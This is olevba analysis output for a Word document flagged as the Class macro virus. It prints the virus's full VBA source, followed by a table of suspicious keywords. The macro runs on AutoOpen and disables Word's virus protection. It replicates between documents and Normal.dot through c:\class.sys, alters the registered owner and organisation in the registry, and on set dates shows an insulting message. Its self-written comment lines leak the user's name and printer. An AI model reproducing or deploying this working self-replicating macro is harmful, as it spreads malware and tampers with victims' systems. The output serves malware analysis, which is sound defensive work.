olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-8f1b6b3904318a7fec436a9c41dc5e9b6c0b0dbc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-8f1b6b3904318a7fec436a9c41dc5e9b6c0b0dbc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
Const REG_SZ As Long = 1
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
Sub AutoOpen()
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
On Error GoTo out
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
Options.VirusProtection = False
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
Options.SaveNormalPrompt = False
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
Options.ConfirmConversions = False
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
If nt > 70 And ad > 0 Then GoTo out
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
If nt < 70 Then
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
End If
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
With host.codemodule
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    For x = 1 To 16
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    .deletelines 1
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    Next x
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
End With
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
If nt < 70 Then
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    With host.codemodule
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    .replaceline 1, "Sub AutoClose()"
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    .replaceline 91, "Sub ToolsMacro()"
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    For x = 70 To 81
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
        .deletelines 62
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    Next x
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    .replaceline 35, "    For x = 1 To 4"
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    End With
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
End If
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
If nt < 70 Then
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Danijel29. 01. 04 00:33:48Epson LX-300 on LPT1:naslovna strana fascikla22.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
u = RegCloseKey(k)
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
End If
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
With host.codemodule
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    For x = 2 To 104 Step 2
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
    Next x
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
End With
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
out:
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
End Sub
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
Sub ViewVBCode()
'Danijel29. 01. 04 00:33:49Epson LX-300 on LPT1:naslovna strana fascikla22.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
